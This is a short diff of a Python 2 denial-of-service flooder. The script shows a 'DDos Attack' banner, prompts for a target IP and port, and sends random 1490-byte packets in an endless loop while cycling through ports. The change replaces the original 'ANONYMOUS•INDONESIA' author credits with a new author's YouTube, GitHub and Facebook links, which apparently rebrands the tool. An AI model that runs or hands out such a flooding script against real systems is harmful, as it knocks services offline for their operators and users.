@@ -20,8 +20,10 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : ANONYMOUS•INDONESIA"
-print "You Tube : DEVA•NURDIYAWANTO"
+print "Author   : HA-MRX"
+print "You Tube : https://www.youtube.com/c/HA-MRX"
+print "github   : https://github.com/Ha3MrX"
+print "Facebook : https://www.facebook.com/muhamad.jabar222"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -46,3 +48,4 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
+
